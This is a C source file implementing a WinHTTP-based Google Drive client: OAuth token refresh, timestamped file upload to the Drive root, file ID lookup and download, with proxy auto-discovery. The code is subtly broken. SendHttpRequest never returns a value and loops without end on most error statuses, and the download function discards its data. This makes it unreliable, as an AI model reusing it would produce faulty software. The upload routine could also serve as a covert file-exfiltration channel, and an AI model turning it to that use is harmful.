#include "pch.h"

static PHTTP_REQUEST CreateHttpRequest
(
	_In_ PGOOGLE_DRIVE This,
	_In_ HttpMethod Method,
	_In_ DWORD dwResolveTimeout,
	_In_ DWORD dwConnectTimeout,
	_In_ DWORD dwSendTimeout,
	_In_ DWORD dwReceiveTimeout,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader
);

BOOL SendHttpRequest
(
	_In_ PGOOGLE_DRIVE This,
	_In_ HttpMethod Method,
	_In_ LPSTR lpUrl,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_Out_ PBYTE* pRespData,
	_Out_ PDWORD pdwRespSize
)
{
	PHTTP_CLIENT pHttpClient = NULL;
	BOOL bResult = FALSE;
	PHTTP_REQUEST pHttpRequest = NULL;
	HINTERNET hRequest = NULL;
	DWORD dwStatusCode = 0;

	pHttpClient = HttpClientInit(UriInit(lpUrl), This->pProxyConfig);
	if (pHttpClient == NULL) {
		goto END;
	}

	while (TRUE) {
		pHttpRequest = CreateHttpRequest(This, Method, 0, 0, 0, 0, lpContentType, lpData, cbData, TRUE);
		hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
		dwStatusCode = ReadStatusCode(hRequest);
		if (dwStatusCode == OK) {
			if (pRespData != NULL) {
				if (!ReceiveData(hRequest, pRespData, pdwRespSize)) {
					if (*pRespData != NULL) {
						FREE(*pRespData);
						
					}

					*pdwRespSize = 0;
				}
			}

			break;
		}
		else if (dwStatusCode == NoContent) {
			wprintf(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
		}
		else if (dwStatusCode == TooManyRequests) {
			wprintf(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
		}
		else if (dwStatusCode == Unauthorized) {
			wprintf(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
			RefreshAccessToken(This);
		}
	}

	bResult = TRUE;
END:
	if (hRequest != NULL) {
		WinHttpCloseHandle(hRequest);
	}

	FreeHttpRequest(pHttpRequest);
	FreeHttpClient(pHttpClient);
}

BOOL RefreshAccessToken
(
	PGOOGLE_DRIVE This
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token\0";
	CHAR lpBody[0x400];
	PHTTP_REQUEST pHttpRequest = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	HINTERNET hRequest = NULL;
	PBYTE pResp = NULL;
	DWORD cbResp = 0;
	BOOL Result = FALSE;
	LPSTR lpResult = NULL;
	DWORD dwStatusCode = 0;

	pHttpClient = HttpClientInit(UriInit(szOauthPath), This->pProxyConfig);
	if (pHttpClient == NULL) {
		goto END;
	}

	SecureZeroMemory(lpBody, sizeof(lpBody));
	sprintf_s(lpBody, _countof(lpBody), "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", This->lpClientId, This->lpClientSecret, This->lpRefreshToken);
	pHttpRequest = CreateHttpRequest(This, POST, 0, 0, 0, 0, GetContentTypeString(ApplicationXWwwFormUrlencoded), lpBody, lstrlenA(lpBody), FALSE);
	if (pHttpRequest == NULL) {
		goto END;
	}

	hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
	if (hRequest == NULL) {
		goto END;
	}

	dwStatusCode = ReadStatusCode(hRequest);
	if (dwStatusCode == OK) {
		if (ReceiveData(hRequest, &pResp, &cbResp) && cbResp > 0) {
			lpResult = SearchMatchStrA(pResp, "access_token\": \"", "\",\n");
		}
		else {
			wprintf(L"ReceiveData failed at %lls. Error code: %d", __FUNCTIONW__, GetLastError());
			goto END;
		}
	}
	else {
		wprintf(L"Status code: %d\n", dwStatusCode);
		goto END;
	}

	This->lpAccessToken = lpResult;
	Result = TRUE;
END:
	if (pResp != NULL) {
		FREE(pResp);
	}

	if (hRequest != NULL) {
		WinHttpCloseHandle(hRequest);
	}

	FreeHttpRequest(pHttpRequest);
	FreeHttpClient(pHttpClient);

	return Result;
}

static PHTTP_REQUEST CreateHttpRequest
(
	_In_ PGOOGLE_DRIVE This,
	_In_ HttpMethod Method,
	_In_ DWORD dwResolveTimeout,
	_In_ DWORD dwConnectTimeout,
	_In_ DWORD dwSendTimeout,
	_In_ DWORD dwReceiveTimeout,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader
)
{
	PHTTP_REQUEST Result = NULL;
	LPSTR lpAuthorizationHeader = NULL;
	LPSTR lpUserAgent = NULL;

	Result = ALLOC(sizeof(HTTP_REQUEST));
	Result->dwConnectTimeout = dwConnectTimeout;
	Result->dwResolveTimeout = dwResolveTimeout;
	Result->dwSendTimeout = dwSendTimeout;
	Result->dwReceiveTimeout = dwReceiveTimeout;
	if (lpContentType != NULL) {
		Result->ContentTy = DuplicateStrA(lpContentType, 0);
	}
	
	if (lpData != NULL) {
		Result->lpData = ALLOC(cbData);
		memcpy(Result->lpData, lpData, cbData);
		Result->cbData = cbData;
	}

	Result->Method = Method;
	if (SetAuthorizationHeader) {
		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(This->lpAccessToken) + 1);
		StrCpyA(lpAuthorizationHeader, "Bearer ");
		StrCatA(lpAuthorizationHeader, This->lpAccessToken);
		Result->Headers[Authorization] = lpAuthorizationHeader;
	}

	lpUserAgent = DuplicateStrA(This->lpUserAgent, 0);
	Result->Headers[UserAgent] = lpUserAgent;

	return Result;
}

PGOOGLE_DRIVE GoogleDriveInit
(
	_In_ LPSTR lpUserAgent,
	_In_ LPSTR lpClientId,
	_In_ LPSTR lpSecret,
	_In_ LPSTR lpRefreshToken
)
{
	LPSTR lpProxy = NULL;
	PGOOGLE_DRIVE lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	lpProxy = GetProxyConfig();
	lpResult = ALLOC(sizeof(GOOGLE_DRIVE));
	lpResult->lpClientId = lpClientId;
	lpResult->lpUserAgent = lpUserAgent;
	lpResult->lpClientSecret = lpSecret;
	lpResult->lpRefreshToken = lpRefreshToken;
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			lpResult->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			lpResult->pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}

		FREE(lpProxy);
	}

	return lpResult;
}

BOOL GoogleDriveUpload
(
	_In_ PGOOGLE_DRIVE This,
	_In_ LPWSTR lpFilePath
)
{
	PBYTE pFileData = NULL;
	DWORD cbFileData = 0;
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	CHAR szNewFileName[0x100];
	SYSTEMTIME SystemTime;
	LPSTR lpExtension = NULL;
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";

	pFileData = ReadFromFile(lpFilePath, &cbFileData);
	if (pFileData == NULL || cbFileData == 0) {
		goto END;
	}

	lpBody = ALLOC(cbFileData + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, cbFileData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			goto END;
		}
	}

	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
	GetSystemTime(&SystemTime);
	lpExtension = ConvertWcharToChar(PathFindExtensionW(lpFilePath));
	sprintf(szNewFileName, "%d-%d-%d-%d-%d-%d%s", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond, lpExtension);
	sprintf(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szNewFileName);
	lpUniqueBoundary = GenRandomStr(16);
	cbBody = sprintf(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szNewFileName);
	memcpy(&lpBody[cbBody], pFileData, cbFileData);
	cbBody += cbFileData;
	cbBody += sprintf(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	sprintf(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	if (!SendHttpRequest(This, POST, szUrl, szContentType, lpBody, cbBody, TRUE, NULL, 0)) {
		goto END;
	}

	Result = TRUE;
END:
	if (pFileData != NULL) {
		FREE(pFileData);
	}

	if (lpExtension != NULL) {
		FREE(lpExtension);
	}

	if (lpUniqueBoundary != NULL) {
		FREE(lpUniqueBoundary);
	}

	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	return Result;
}

BOOL GetFileId
(
	_In_ PGOOGLE_DRIVE This,
	_In_ LPSTR lpName,
	_Out_ LPSTR* pId
)
{
	CHAR szUrl[0x200] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20=%20%27";
	PBYTE pRespData = NULL;
	DWORD cbResp = 0;
	BOOL bResult = FALSE;
	LPSTR lpResult = NULL;

	sprintf(&szUrl[lstrlenA(szUrl)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
	printf("szUrl: %s\n", szUrl);
	if (!SendHttpRequest(This, GET, szUrl, NULL, NULL, 0, TRUE, &pRespData, &cbResp)) {
		wprintf(L"SendHttpRequest failed at %lls\n", __FUNCTIONW__);
		goto END;
	}

	lpResult = SearchMatchStrA(pRespData, "\"id\": \"", "\",\n");
	if (lpResult != NULL) {
		*pId = lpResult;
	}

	bResult = TRUE;
END:
	return bResult;
}

BOOL GoogleDriveDownload
(
	_In_ PGOOGLE_DRIVE This,
	_In_ LPSTR lpFileId
)
{
	CHAR szUrl[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PBYTE pFileData = NULL;
	DWORD dwFileSize = 0;
	BOOL bResult = FALSE;

	sprintf(&szUrl[lstrlenA(szUrl)], "%s?alt=media", lpFileId);
	if (!SendHttpRequest(This, GET, szUrl, NULL, NULL, 0, TRUE, &pFileData, &dwFileSize)) {
		wprintf(L"SendHttpRequest failed at %lls\n", __FUNCTIONW__);
		goto END;
	}

	bResult = TRUE;
END:
	return bResult;
}